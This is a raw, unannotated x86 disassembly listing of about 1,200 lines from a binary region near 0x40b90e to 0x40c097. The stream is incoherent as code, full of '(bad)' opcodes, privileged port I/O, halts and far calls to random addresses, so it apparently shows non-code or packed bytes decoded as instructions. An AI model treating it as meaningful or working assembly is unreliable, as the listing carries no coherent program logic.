  40b90e:	shr    DWORD PTR ds:0xdbe1b2e8,0x62
  40b915:	sbb    al,0xcd
  40b917:	push   ss
  40b918:	sub    DWORD PTR [ebp+0x10],0x1429914
  40b91f:	xor    ecx,DWORD PTR [edi-0x45636b6f]
  40b925:	xchg   cl,cl
  40b927:	inc    edi
  40b928:	sar    BYTE PTR [eax],0xb7
  40b92b:	add    DWORD PTR [esi+ecx*1],eax
  40b92e:	out    0x38,al
  40b930:	cwde   
  40b931:	xor    BYTE PTR [ebx+0x7babba0d],dl
  40b937:	adc    BYTE PTR ds:0x7b170e88,dl
  40b93d:	add    edx,esp
  40b93f:	jb     0x40b8c1
  40b941:	push   ds
  40b942:	stc    
  40b943:	mov    ecx,0x931b611b
  40b948:	popf   
  40b949:	mov    bh,0x7a
  40b94b:	std    
  40b94c:	lock and edx,DWORD PTR [esi]
  40b94f:	std    
  40b950:	dec    ebx
  40b951:	std    
  40b952:	mov    es,WORD PTR [edx]
  40b954:	enter  0xdaa8,0xf0
  40b958:	div    DWORD PTR [ebx]
  40b95a:	fucomi st,st(7)
  40b95c:	fwait
  40b95d:	sbb    bl,dh
  40b95f:	mov    al,ds:0x3873e914
  40b964:	ja     0x40b94f
  40b966:	in     eax,0x75
  40b968:	xor    BYTE PTR [eax+esi*8+0x2a],ch
  40b96c:	call   FWORD PTR [esi-0x234d75e7]
  40b972:	retf   
  40b973:	fwait
  40b974:	mov    edi,0xf50c9b46
  40b979:	shl    BYTE PTR [ebp+0x4c],1
  40b97c:	retf   0xdaed
  40b97f:	test   al,0xaf
  40b981:	pop    esp
  40b982:	leave  
  40b983:	imul   eax,esi,0xffffffe6
  40b986:	or     eax,0xe0511849
  40b98b:	lahf   
  40b98c:	ret    
  40b98d:	pushf  
  40b98e:	mov    bh,0x74
  40b990:	scas   al,BYTE PTR es:[edi]
  40b991:	fadd   QWORD PTR [ebx]
  40b993:	inc    esp
  40b994:	or     BYTE PTR [eax],cl
  40b996:	jb     0x40b92e
  40b998:	fwait
  40b999:	mov    al,ds:0x31fe0dd7
  40b99e:	mov    dl,0xe5
  40b9a0:	aas    
  40b9a1:	xor    dh,ch
  40b9a3:	jae    0x40b9fb
  40b9a5:	inc    esp
  40b9a6:	xor    al,0xd3
  40b9a8:	pop    edx
  40b9a9:	jno    0x40b97a
  40b9ab:	dec    esp
  40b9ac:	mov    esi,0x15f0cdcd
  40b9b1:	call   0x979670ca
  40b9b6:	ds std 
  40b9b8:	inc    edx
  40b9b9:	fild   DWORD PTR [edx-0xe]
  40b9bc:	std    
  40b9bd:	or     al,0x9b
  40b9bf:	push   esi
  40b9c0:	xchg   al,dh
  40b9c2:	ja     0x40b94a
  40b9c4:	and    eax,0x7807575f
  40b9c9:	jno    0x40b96e
  40b9cb:	inc    ebp
  40b9cc:	inc    ecx
  40b9cd:	call   0x3112:0x12bafdcb
  40b9d4:	add    DWORD PTR ds:0x40e211e2,ebp
  40b9da:	mov    esi,edi
  40b9dc:	out    0x1b,eax
  40b9de:	sub    al,0x43
  40b9e0:	out    dx,al
  40b9e1:	mov    es,WORD PTR [edx]
  40b9e3:	xor    eax,0xf9502369
  40b9e8:	or     cl,BYTE PTR [esi+0x1b12aa87]
  40b9ee:	adc    ah,dh
  40b9f0:	loop   0x40b9eb
  40b9f2:	aam    0xdf
  40b9f4:	mov    dh,0x3b
  40b9f6:	mov    ds:0x7d59cf26,al
  40b9fb:	out    0xb5,eax
  40b9fd:	sbb    al,0x45
  40b9ff:	adc    edi,DWORD PTR [edi]
  40ba01:	jns    0x40ba62
  40ba03:	mov    DWORD PTR [edx],ebx
  40ba05:	dec    eax
  40ba06:	jl     0x40ba7b
  40ba08:	mov    ch,0x18
  40ba0a:	sbb    DWORD PTR [ecx-0x69],edx
  40ba0d:	fld    QWORD PTR [edi-0x119fca36]
  40ba13:	jg     0x40b9d8
  40ba15:	mov    ebp,DWORD PTR [ebp+0x3b4238ec]
  40ba1b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40ba1d:	xor    BYTE PTR [ecx-0x1584e178],cl
  40ba23:	bswap  ebx
  40ba25:	fisub  WORD PTR [eax]
  40ba27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba28:	xchg   edi,eax
  40ba29:	(bad)  
  40ba2a:	call   0xc472:0x20e7fa77
  40ba31:	sub    eax,0xbaa06359
  40ba36:	add    DWORD PTR [edx],ebx
  40ba38:	cmp    DWORD PTR gs:[ebx+ecx*4-0x581c0a95],eax
  40ba40:	pop    esi
  40ba41:	mov    eax,ds:0xefdf3132
  40ba46:	cmp    cl,ah
  40ba48:	jne    0x40ba3b
  40ba4a:	sbb    eax,0x4a7799a3
  40ba4f:	push   ds
  40ba50:	xor    esi,DWORD PTR [edx+0x1aeef7d7]
  40ba56:	ror    BYTE PTR [eax+0x2],0x82
  40ba5a:	xchg   esi,eax
  40ba5b:	pop    es
  40ba5c:	and    DWORD PTR ds:[ecx],esi
  40ba5f:	ss add al,al
  40ba62:	scas   eax,DWORD PTR es:[edi]
  40ba63:	or     bh,BYTE PTR [ecx+0x3a377afc]
  40ba69:	cmp    BYTE PTR [esi+ebp*4],dl
  40ba6c:	sbb    eax,0x6fda4216
  40ba71:	pop    esi
  40ba72:	push   ss
  40ba73:	inc    edx
  40ba74:	ja     0x40ba2c
  40ba76:	bound  ecx,QWORD PTR [edx]
  40ba78:	les    esp,FWORD PTR [ecx+0x3f2fb119]
  40ba7e:	inc    eax
  40ba7f:	sub    al,0x18
  40ba81:	sbb    ch,0x22
  40ba84:	add    esp,ecx
  40ba86:	xor    eax,0xd7ec5007
  40ba8b:	sub    DWORD PTR [ebx+0x1a],ebp
  40ba8e:	hlt    
  40ba8f:	xor    edi,esp
  40ba91:	xor    DWORD PTR [edi-0x6c6cb885],ecx
  40ba97:	push   edi
  40ba98:	xlat   BYTE PTR ds:[ebx]
  40ba99:	call   0x79c5aad5
  40ba9e:	mul    BYTE PTR [ecx-0x700a0f9b]
  40baa4:	popa   
  40baa5:	aaa    
  40baa6:	imul   esi,DWORD PTR [ebx+edi*4-0x1fa42beb],0x7c5c55bf
  40bab1:	gs (bad) 
  40bab3:	sar    DWORD PTR [edx+edi*8],0x8e
  40bab7:	je     0x40baed
  40bab9:	mov    ah,0x51
  40babb:	cmc    
  40babc:	jl     0x40bb29
  40babe:	dec    edx
  40babf:	jg     0x40ba8a
  40bac1:	push   0xffffffb0
  40bac3:	xchg   esi,eax
  40bac4:	mov    ebp,0x74b3c718
  40bac9:	repnz es (bad) 
  40bacc:	in     al,dx
  40bacd:	push   0x46baca02
  40bad2:	add    DWORD PTR [edi+0x2190de32],eax
  40bad8:	hlt    
  40bad9:	fisttp QWORD PTR ds:0x7d3d1464
  40badf:	mov    edx,?
  40bae1:	jb     0x40bb2a
  40bae3:	call   0x8717:0x746fdd65
  40baea:	addr16 sbb dh,dl
  40baed:	pop    ebp
  40baee:	xchg   esi,eax
  40baef:	mov    gs,WORD PTR [ecx-0x37]
  40baf2:	sub    eax,0x6452d455
  40baf7:	cmp    ebp,DWORD PTR [eax-0x6a]
  40bafa:	mov    al,0x24
  40bafd:	jae    0x40bac9
  40baff:	or     al,0x68
  40bb01:	add    BYTE PTR [ebx+0x54],cl
  40bb04:	hlt    
  40bb05:	jl     0x40bb81
  40bb07:	shr    al,cl
  40bb09:	popf   
  40bb0a:	cmp    DWORD PTR [ebx],0x31b2bad
  40bb10:	not    BYTE PTR [ebx]
  40bb12:	lods   al,BYTE PTR ds:[esi]
  40bb13:	push   esp
  40bb14:	in     al,dx
  40bb15:	add    BYTE PTR [eax-0x46],ah
  40bb18:	retf   
  40bb19:	imul   BYTE PTR [edi-0x4324074f]
  40bb1f:	call   0xf95d3c26
  40bb24:	sbb    eax,0x8de6dae8
  40bb29:	inc    ecx
  40bb2a:	test   edx,edx
  40bb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2d:	mov    ds:0xdd59fc18,eax
  40bb32:	ret    
  40bb33:	ret    0x8984
  40bb36:	sub    eax,0x3af0d008
  40bb3b:	add    dh,al
  40bb3d:	xchg   edi,eax
  40bb3e:	jmp    0x40bb38
  40bb40:	mov    ch,bh
  40bb42:	iret   
  40bb43:	jg     0x40bac7
  40bb45:	inc    ecx
  40bb46:	out    dx,eax
  40bb47:	add    esp,edi
  40bb49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb4a:	inc    ecx
  40bb4b:	add    DWORD PTR [ecx],ebp
  40bb4d:	fld    TBYTE PTR [ecx]
  40bb4f:	mov    bl,0xc5
  40bb51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb52:	ss leave 
  40bb54:	mov    ebx,0x3bc364a2
  40bb59:	mov    esi,0xc7ab686
  40bb5e:	sbb    ah,BYTE PTR [ecx+0x101d5ac1]
  40bb64:	add    bl,dh
  40bb66:	inc    esi
  40bb67:	mov    ch,0x68
  40bb69:	xor    esi,DWORD PTR [edx]
  40bb6b:	push   0xd0979d47
  40bb70:	enter  0xe5cc,0x7d
  40bb74:	dec    esp
  40bb75:	ret    0x2644
  40bb78:	loope  0x40bbf1
  40bb7a:	fs pop ds
  40bb7c:	dec    esi
  40bb7d:	fs into 
  40bb7f:	pop    esp
  40bb80:	push   edi
  40bb82:	and    BYTE PTR [eax+0x74],0xb0
  40bb86:	mov    bl,0x4a
  40bb88:	lahf   
  40bb89:	mov    ds:0x98f2c90d,al
  40bb8e:	outs   dx,BYTE PTR ds:[esi]
  40bb8f:	cmp    eax,DWORD PTR [eax+0x648d5dca]
  40bb95:	test   al,0x91
  40bb97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb98:	cmp    ebx,esi
  40bb9a:	xchg   esi,eax
  40bb9b:	test   DWORD PTR [ecx+0x23a3604],esp
  40bba1:	ja     0x40bbb7
  40bba3:	xchg   ebx,eax
  40bba4:	dec    ebp
  40bba5:	pop    edi
  40bba6:	ja     0x40bbdd
  40bba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bba9:	cmp    dh,cl
  40bbab:	fwait
  40bbac:	nop    DWORD PTR [edx]
  40bbaf:	ss dec edi
  40bbb1:	iret   
  40bbb2:	rol    BYTE PTR [ebx+ebx*1],cl
  40bbb5:	stos   BYTE PTR es:[edi],al
  40bbb6:	push   ss
  40bbb7:	sub    DWORD PTR [esi+0x28],esp
  40bbba:	jge    0x40bbc5
  40bbbc:	aas    
  40bbbd:	add    esi,DWORD PTR [edx-0x42]
  40bbc0:	or     al,0x37
  40bbc2:	xor    BYTE PTR [esi+0x34607a68],ch
  40bbc8:	jae    0x40bc24
  40bbca:	out    0x4c,eax
  40bbcc:	(bad)  
  40bbcd:	jg     0x40bc44
  40bbcf:	arpl   ax,bx
  40bbd1:	test   eax,0x8b431ba7
  40bbd6:	js     0x40bb62
  40bbd8:	test   BYTE PTR [ecx-0x46],ch
  40bbdb:	xchg   edi,eax
  40bbdc:	adc    ebp,eax
  40bbde:	mov    edi,0x28ef40c3
  40bbe3:	and    eax,0x7332ba3e
  40bbe8:	adc    eax,0xbf02d262
  40bbed:	(bad)  
  40bbee:	push   esp
  40bbef:	das    
  40bbf0:	imul   DWORD PTR [ebp+0x4035df02]
  40bbf6:	mov    dh,0x57
  40bbf8:	jp     0x40bbab
  40bbfa:	mov    ah,0x95
  40bbfc:	jg     0x40bbdb
  40bbfe:	scas   eax,DWORD PTR es:[edi]
  40bbff:	inc    ebp
  40bc00:	ret    0x61b2
  40bc03:	cmp    edx,DWORD PTR [esi+esi*4+0x54]
  40bc07:	cmp    eax,0x4a407701
  40bc0c:	imul   DWORD PTR [ebx+0x41689fa4]
  40bc12:	add    DWORD PTR [edx],ebx
  40bc14:	(bad)  
  40bc15:	mov    edi,0x672a0648
  40bc1a:	push   edx
  40bc1b:	out    0xa2,al
  40bc1d:	cld    
  40bc1e:	test   DWORD PTR [ebx],0x465a4a36
  40bc24:	cmp    al,BYTE PTR [esi+0x2ad81393]
  40bc2a:	fbld   TBYTE PTR [edx]
  40bc2c:	inc    ecx
  40bc2d:	sbb    eax,0xa41ed98
  40bc32:	jmp    0x32fcbf49
  40bc37:	pop    es
  40bc38:	lahf   
  40bc39:	shl    BYTE PTR [eax-0x2d],cl
  40bc3c:	xor    edi,ecx
  40bc3e:	jmp    esi
  40bc40:	call   0x8850f0e0
  40bc45:	pop    edx
  40bc46:	jbe    0x40bcc4
  40bc48:	or     al,0x10
  40bc4a:	dec    BYTE PTR [ebx+0x56ca01be]
  40bc50:	adc    eax,DWORD PTR [esi]
  40bc52:	int3   
  40bc53:	std    
  40bc54:	jg     0x40bc09
  40bc56:	sbb    eax,0x6d1624e7
  40bc5b:	inc    edx
  40bc5c:	mov    ds:0x3473a905,eax
  40bc61:	push   0xffffffe5
  40bc63:	inc    esp
  40bc64:	push   ecx
  40bc65:	repnz pusha 
  40bc67:	je     0x40bc11
  40bc69:	adc    eax,0xe5ab72d5
  40bc6e:	jmp    0x96a66dac
  40bc73:	add    al,0x61
  40bc75:	retf   0xaf6
  40bc78:	cmp    ecx,DWORD PTR [edx+eax*4+0x6a4677c1]
  40bc7f:	adc    al,0x2
  40bc81:	out    0x95,al
  40bc83:	dec    eax
  40bc84:	fidivr DWORD PTR [edi]
  40bc86:	ins    BYTE PTR es:[edi],dx
  40bc87:	imul   ebp,esp,0x3a
  40bc8a:	or     al,0x4c
  40bc8c:	xchg   esi,eax
  40bc8d:	mov    al,0x45
  40bc8f:	jmp    0x40bc4d
  40bc91:	push   ecx
  40bc92:	rcl    BYTE PTR [edi+0x21],0xa5
  40bc96:	push   es
  40bc97:	leave  
  40bc98:	fdiv   DWORD PTR [eax*4-0x5c504381]
  40bc9f:	jb     0x40bc6e
  40bca1:	inc    edi
  40bca2:	iret   
  40bca3:	cmp    ah,al
  40bca5:	loope  0x40bcc1
  40bca7:	mov    ds:0xa8116c07,eax
  40bcac:	mov    ds:0x206660a8,eax
  40bcb1:	retf   0x8ecb
  40bcb4:	test   DWORD PTR [edx+eax*4-0x4b206d5c],esi
  40bcbb:	push   0xffffff89
  40bcbd:	or     BYTE PTR [ebx-0x3d7746c4],bh
  40bcc3:	cmp    eax,0xbaa8270d
  40bcc8:	aad    0x9
  40bcca:	shr    BYTE PTR [ebx+0x50a080f9],1
  40bcd0:	xchg   DWORD PTR [esi],ecx
  40bcd2:	out    0xf0,eax
  40bcd4:	push   esp
  40bcd5:	pop    ecx
  40bcd6:	jl     0x40bd43
  40bcd8:	mov    al,ds:0x5fc1c3e7
  40bcdd:	stc    
  40bcde:	add    ch,bh
  40bce0:	bound  esi,QWORD PTR [ecx-0x4718e135]
  40bce6:	and    dh,BYTE PTR [edx-0x36]
  40bce9:	dec    ecx
  40bcea:	mov    eax,0xe0654af6
  40bcef:	scas   eax,DWORD PTR es:[edi]
  40bcf0:	jbe    0x40bd5e
  40bcf2:	fsub   DWORD PTR [esi]
  40bcf4:	hlt    
  40bcf5:	cmp    cl,cl
  40bcf7:	pop    edi
  40bcf8:	jge    0x40bc92
  40bcfa:	mov    al,0x9e
  40bcfc:	xchg   ebx,eax
  40bcfd:	arpl   WORD PTR [edi-0x114c77f0],dx
  40bd03:	(bad)  
  40bd04:	dec    ecx
  40bd05:	mov    ds,ebx
  40bd07:	and    ebx,DWORD PTR [ebp-0x1b9ac3eb]
  40bd0d:	(bad)  
  40bd0f:	stc    
  40bd10:	pop    ds
  40bd11:	jl     0x40bcd4
  40bd13:	jle    0x40bd05
  40bd15:	shr    DWORD PTR [ebx],0xc2
  40bd18:	mov    ebx,0xa8320254
  40bd1d:	sbb    DWORD PTR [ecx],0xffffffff
  40bd20:	mov    ?,WORD PTR [edx]
  40bd22:	add    esi,DWORD PTR [esi+0x5797a321]
  40bd28:	xchg   edi,eax
  40bd29:	inc    esi
  40bd2a:	inc    eax
  40bd2b:	sub    al,0x3
  40bd2d:	fistp  QWORD PTR ss:[ecx]
  40bd30:	test   al,0xc4
  40bd32:	scas   eax,DWORD PTR es:[edi]
  40bd33:	mov    ch,0xc
  40bd35:	lods   eax,DWORD PTR ds:[esi]
  40bd36:	bound  ecx,QWORD PTR [edx-0x1521400b]
  40bd3c:	test   eax,0x7c924f4d
  40bd41:	inc    esi
  40bd42:	pop    ss
  40bd43:	xchg   edi,eax
  40bd44:	rcl    BYTE PTR [esi+0x68],0x37
  40bd48:	mov    al,0xdd
  40bd4a:	outs   dx,BYTE PTR ds:[esi]
  40bd4b:	xchg   edi,eax
  40bd4c:	dec    esp
  40bd4d:	pop    ebp
  40bd4e:	xchg   edi,eax
  40bd4f:	sbb    DWORD PTR [esi+eax*2-0xef88875],ebp
  40bd56:	out    0xd,al
  40bd58:	dec    ebp
  40bd59:	adc    BYTE PTR [edi],ch
  40bd5b:	jnp    0x40bda0
  40bd5d:	pop    es
  40bd5e:	mov    al,cl
  40bd60:	loopne 0x40bd85
  40bd62:	ss sbb eax,0x820bcb53
  40bd68:	push   0x5b78c069
  40bd6d:	call   0x1ab3:0xe39a3c36
  40bd74:	or     DWORD PTR [ebp-0x72e87f11],eax
  40bd7a:	mov    esp,0xeccbc9fc
  40bd7f:	adc    ebx,DWORD PTR [edi+0x10a357cc]
  40bd85:	in     eax,dx
  40bd86:	imul   ebx,DWORD PTR [ebp+0x7],0x6e
  40bd8a:	adc    DWORD PTR ss:0xbbf85dc8,esi
  40bd91:	loope  0x40bd57
  40bd93:	sbb    bl,BYTE PTR [edi+0x72f536f3]
  40bd99:	je     0x40bd2e
  40bd9b:	pop    esp
  40bd9c:	xor    eax,0xef843395
  40bda1:	xchg   edx,eax
  40bda2:	inc    ebp
  40bda3:	jb     0x40bd55
  40bda5:	gs sub al,0x58
  40bda8:	mov    dh,0x11
  40bdaa:	and    BYTE PTR [ebx-0x7],bl
  40bdad:	ss push ds
  40bdaf:	pusha  
  40bdb0:	cli    
  40bdb1:	je     0x40be11
  40bdb3:	mov    esi,0xb4894d9b
  40bdb8:	je     0x40be28
  40bdba:	repz add eax,0x8958262c
  40bdc0:	outs   dx,DWORD PTR ds:[esi]
  40bdc1:	iret   
  40bdc2:	adc    eax,0x49c431b0
  40bdc7:	(bad)  
  40bdc9:	scas   eax,DWORD PTR es:[edi]
  40bdca:	fwait
  40bdcb:	mov    dh,0x93
  40bdcd:	lahf   
  40bdce:	sub    ah,ah
  40bdd0:	fst    DWORD PTR [ebx+ebx*2+0x7f]
  40bdd4:	loop   0x40bdce
  40bdd6:	inc    ecx
  40bdd7:	inc    eax
  40bdd8:	ret    0x1d7f
  40bddb:	jno    0x40be41
  40bddd:	push   esp
  40bdde:	cmp    eax,0x99c9a8d7
  40bde3:	int    0x9
  40bde5:	div    BYTE PTR [edx-0x70971879]
  40bdeb:	lea    ecx,[ebx-0x25]
  40bdee:	ror    ecx,1
  40bdf0:	fisubr DWORD PTR [eax]
  40bdf2:	or     eax,0x9827fe9e
  40bdf7:	iret   
  40bdf8:	cmp    ecx,DWORD PTR [edx+0xe1ba682]
  40bdfe:	gs push ecx
  40be00:	dec    BYTE PTR [esi+0x58]
  40be03:	lods   al,BYTE PTR ds:[esi]
  40be04:	js     0x40be44
  40be06:	fldcw  WORD PTR [ecx+esi*1+0x1]
  40be0a:	std    
  40be0b:	les    ecx,FWORD PTR [ebp+0x6acd65a8]
  40be11:	(bad)  
  40be12:	mov    cl,0xd2
  40be14:	sub    eax,0x90ddd5e7
  40be19:	add    esp,edi
  40be1b:	imul   esp,DWORD PTR [ebx-0x6ccb9dce],0xffaac0f
  40be25:	ja     0x40bea5
  40be27:	push   0xf7b624a1
  40be2c:	daa    
  40be2d:	xchg   BYTE PTR [edi+eax*1-0x33],dh
  40be31:	test   BYTE PTR [esi+0x5a],0x33
  40be35:	sub    BYTE PTR [ebx+0x50],0xf1
  40be39:	pop    esp
  40be3a:	hlt    
  40be3b:	push   ds
  40be3c:	dec    eax
  40be3d:	bound  edi,QWORD PTR [eax]
  40be3f:	imul   esp,DWORD PTR [edx+0x2f],0xffffff88
  40be43:	dec    ecx
  40be44:	sub    dh,BYTE PTR ds:0x8537a435
  40be4a:	jmp    0x40bdfd
  40be4c:	pop    esp
  40be4d:	adc    DWORD PTR [ecx*2+0x259ff13c],ecx
  40be54:	or     BYTE PTR [eax-0x764e1358],al
  40be5a:	mov    eax,ds:0xf541b979
  40be5f:	nop
  40be60:	sbb    al,0x60
  40be62:	ret    
  40be63:	cmp    BYTE PTR [ebx],bl
  40be65:	scas   eax,DWORD PTR es:[edi]
  40be66:	inc    ebp
  40be67:	mov    al,BYTE PTR [ebx]
  40be69:	pop    ebp
  40be6a:	movlps xmm4,QWORD PTR [ebp+0x51]
  40be6e:	retf   0xfb2
  40be71:	sahf   
  40be72:	dec    ebx
  40be73:	push   ecx
  40be74:	in     eax,0x7b
  40be76:	hlt    
  40be77:	jp     0x40be0f
  40be79:	or     al,0x5a
  40be7b:	xchg   BYTE PTR [ebx+0x5006568],dh
  40be81:	aas    
  40be82:	ins    DWORD PTR es:[edi],dx
  40be83:	ror    DWORD PTR [ebx+0x5c],1
  40be86:	jo     0x40be45
  40be88:	add    al,0x33
  40be8a:	add    BYTE PTR [ecx],dl
  40be8c:	pop    eax
  40be8d:	out    dx,al
  40be8e:	mov    dl,0xa0
  40be90:	pop    ds
  40be91:	das    
  40be92:	push   es
  40be93:	xlat   BYTE PTR ds:[ebx]
  40be94:	or     eax,0xc615c303
  40be99:	pushf  
  40be9a:	mov    ds:0x49cb0099,eax
  40be9f:	in     eax,0x2a
  40bea1:	clc    
  40bea2:	jb     0x40becb
  40bea4:	daa    
  40bea5:	dec    edx
  40bea6:	jae    0x40be5b
  40bea8:	stc    
  40bea9:	test   al,0xef
  40beac:	jg     0x40bec5
  40beae:	add    dh,ah
  40beb0:	rol    DWORD PTR ds:0x1b63b87b,cl
  40beb6:	mov    dh,0x15
  40beb8:	out    dx,al
  40beb9:	stc    
  40beba:	fxch   st(4)
  40bebc:	add    al,0xd5
  40bebe:	mov    esi,0x6c74eeb4
  40bec3:	adc    ch,al
  40bec5:	xor    al,0x48
  40bec7:	cmp    eax,0xfe9ec75c
  40becc:	call   0x5b895880
  40bed1:	or     BYTE PTR [edx-0x1c],bl
  40bed4:	popa   
  40bed5:	pop    esp
  40bed6:	push   es
  40bed7:	nop
  40bed8:	push   ds
  40bed9:	(bad)  
  40beda:	pop    ebp
  40bedb:	hlt    
  40bedc:	in     eax,0x9b
  40bede:	xchg   ebp,eax
  40bedf:	or     ah,al
  40bee1:	inc    ebp
  40bee2:	pushf  
  40bee3:	fs mov ecx,0x753baea6
  40bee9:	into   
  40beea:	int3   
  40beeb:	or     DWORD PTR [edx-0x22],edi
  40beee:	or     DWORD PTR [ebp-0x37],eax
  40bef1:	push   ebx
  40bef2:	push   edi
  40bef3:	mov    al,0x3
  40bef5:	ja     0x40bf27
  40bef7:	push   es
  40bef8:	outs   dx,DWORD PTR ds:[esi]
  40bef9:	mov    eax,0x2902423
  40befe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beff:	fsub   st(2),st
  40bf01:	pop    edi
  40bf02:	push   ebx
  40bf03:	inc    ebx
  40bf04:	ror    BYTE PTR ds:[ebx],1
  40bf07:	sub    ecx,DWORD PTR [esi-0x3f]
  40bf0a:	dec    eax
  40bf0b:	addr16 aas 
  40bf0d:	pop    ss
  40bf0e:	sub    edi,DWORD PTR [ebp+0x31eced3c]
  40bf14:	sub    eax,0xc99585ef
  40bf19:	cmp    bh,BYTE PTR [ebx]
  40bf1b:	addr16 in eax,0xfd
  40bf1e:	dec    esi
  40bf1f:	jmp    0x3b5f:0x1bf0d1ce
  40bf26:	out    dx,eax
  40bf27:	cmc    
  40bf28:	shl    DWORD PTR [ecx+0x30159c95],cl
  40bf2e:	lods   al,BYTE PTR ds:[esi]
  40bf2f:	dec    ebx
  40bf30:	imul   ecx,DWORD PTR [ecx],0x50a1962b
  40bf36:	out    0x2,al
  40bf38:	push   ebx
  40bf39:	and    al,BYTE PTR [eax]
  40bf3b:	fistp  WORD PTR [esi]
  40bf3d:	call   0x4dc0:0xdf7f4a71
  40bf44:	or     dl,BYTE PTR [esi+0x7b]
  40bf47:	mov    ?,esi
  40bf49:	shr    al,1
  40bf4b:	or     eax,0x24bacbc5
  40bf50:	or     BYTE PTR [esi],al
  40bf52:	bsr    ecx,DWORD PTR [eax-0x6d]
  40bf56:	and    BYTE PTR [ebp-0x60],bh
  40bf59:	pop    es
  40bf5a:	ss push edx
  40bf5c:	mov    ch,0x8c
  40bf5e:	pop    edi
  40bf5f:	lea    ebp,[edi-0x15]
  40bf62:	jno    0x40bf8e
  40bf64:	sbb    ch,bh
  40bf66:	mov    bh,0x9c
  40bf68:	mov    cl,0x88
  40bf6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf6b:	or     BYTE PTR [ebx+esi*1],dh
  40bf6e:	or     eax,edx
  40bf70:	pop    edi
  40bf71:	and    esi,edi
  40bf73:	xchg   edi,eax
  40bf74:	xchg   DWORD PTR es:[eax-0x1d3f1c83],ebp
  40bf7b:	retf   0xf9aa
  40bf7e:	aas    
  40bf7f:	push   DWORD PTR [edx+0x1a73623d]
  40bf85:	fild   WORD PTR [edi]
  40bf87:	or     edx,DWORD PTR [ebp-0x62]
  40bf8a:	jmp    0xc11c:0xe650434e
  40bf91:	cmp    al,0x68
  40bf93:	sub    dh,bh
  40bf95:	jb     0x40bf86
  40bf97:	cmp    esi,ebx
  40bf99:	xchg   esi,eax
  40bf9a:	and    eax,0xa1a00c69
  40bf9f:	popf   
  40bfa0:	xor    DWORD PTR [eax+edx*2-0x7b63158b],0x43464ca3
  40bfab:	xor    cl,ah
  40bfad:	aas    
  40bfae:	push   0x8158673b
  40bfb3:	mov    ?,WORD PTR [edx-0x73f3a948]
  40bfb9:	into   
  40bfba:	cmp    BYTE PTR [ebx],bl
  40bfbc:	outs   dx,DWORD PTR ds:[esi]
  40bfbd:	xchg   esp,eax
  40bfbe:	jae    0x40bfd0
  40bfc0:	icebp  
  40bfc1:	mov    ebx,0x57a2190b
  40bfc6:	ja     0x40c024
  40bfc8:	inc    ebp
  40bfc9:	scas   eax,DWORD PTR es:[edi]
  40bfca:	cmp    DWORD PTR [esi+0x17],edi
  40bfcd:	test   BYTE PTR [edi-0x21379369],0x14
  40bfd4:	jle    0x40bf7e
  40bfd6:	jmp    0x798c:0x119c826e
  40bfdd:	scas   eax,DWORD PTR es:[edi]
  40bfde:	aaa    
  40bfdf:	sbb    al,0xd
  40bfe1:	lds    esp,FWORD PTR [eax+0x6182d42d]
  40bfe7:	(bad)  
  40bfe8:	pop    ds
  40bfe9:	ret    
  40bfea:	sub    cl,BYTE PTR ds:0x94fa776
  40bff0:	adc    al,dl
  40bff2:	jne    0x40bf99
  40bff4:	std    
  40bff5:	inc    ebx
  40bff6:	in     eax,dx
  40bff7:	fstp   QWORD PTR [esi-0x48]
  40bffa:	jg     0x40c045
  40bffc:	dec    eax
  40bffd:	jno    0x40bfc3
  40bfff:	pop    es
  40c000:	sub    BYTE PTR [ebx+0x1ab254d0],al
  40c006:	(bad)  
  40c007:	stos   BYTE PTR es:[edi],al
  40c008:	adc    ebp,DWORD PTR [ebp+0x4a]
  40c00b:	cmc    
  40c00c:	jecxz  0x40bfad
  40c00e:	ins    DWORD PTR es:[edi],dx
  40c00f:	add    dh,BYTE PTR [ebp-0x2123fddb]
  40c015:	push   0x653073e
  40c01a:	dec    ebp
  40c01b:	cmc    
  40c01c:	add    al,0xd8
  40c01e:	mov    dh,dl
  40c020:	jne    0x40bfe2
  40c022:	xchg   edx,eax
  40c023:	fmul   st,st(6)
  40c025:	inc    ebx
  40c026:	pop    edi
  40c027:	fwait
  40c028:	jae    0x40c065
  40c02a:	lock aas 
  40c02c:	(bad)  
  40c02d:	jle    0x40c009
  40c02f:	add    eax,0x3cd29200
  40c034:	pop    ebx
  40c035:	es (bad) 
  40c037:	ds sub eax,0x72a84101
  40c03d:	fnstcw WORD PTR [ebx+0x3a]
  40c040:	xchg   edx,eax
  40c041:	mov    edx,0x3e6a2d45
  40c046:	mov    eax,0xf8f36957
  40c04b:	pop    ss
  40c04c:	stc    
  40c04d:	stos   BYTE PTR es:[edi],al
  40c04e:	enter  0x1bfd,0xe0
  40c052:	inc    ebx
  40c053:	sub    DWORD PTR [eax+0x8],ebx
  40c056:	adc    edi,DWORD PTR [ebx+0x16]
  40c059:	loopne 0x40bfe0
  40c05b:	out    0x1c,eax
  40c05d:	test   BYTE PTR [esi-0x4bff5796],bl
  40c063:	jns    0x40c05e
  40c065:	xchg   ebx,eax
  40c066:	jg     0x40c0d0
  40c068:	adc    al,0x1f
  40c06a:	je     0x40c01f
  40c06c:	stos   BYTE PTR es:[edi],al
  40c06d:	add    BYTE PTR ds:0x68dad53f,dh
  40c073:	xor    bl,BYTE PTR [eax]
  40c075:	cmp    al,0x1f
  40c077:	shl    DWORD PTR [ebp-0x6e],0x4d
  40c07b:	jle    0x40c07f
  40c07d:	adc    BYTE PTR [eax],bh
  40c07f:	ins    DWORD PTR es:[edi],dx
  40c080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c081:	inc    edi
  40c082:	push   eax
  40c083:	push   ebx
  40c084:	rcr    bl,cl
  40c086:	shl    DWORD PTR [ebx+0x6bac5ddc],0xe
  40c08d:	inc    ebp
  40c08e:	pop    esp
  40c08f:	or     esi,DWORD PTR [eax]
  40c091:	pop    ecx
  40c092:	inc    ecx
  40c093:	ins    DWORD PTR es:[edi],dx
  40c094:	fucomp st(5)
  40c096:	push   edi
  40c097:	arpl   WORD PTR [edx-0x4],cx
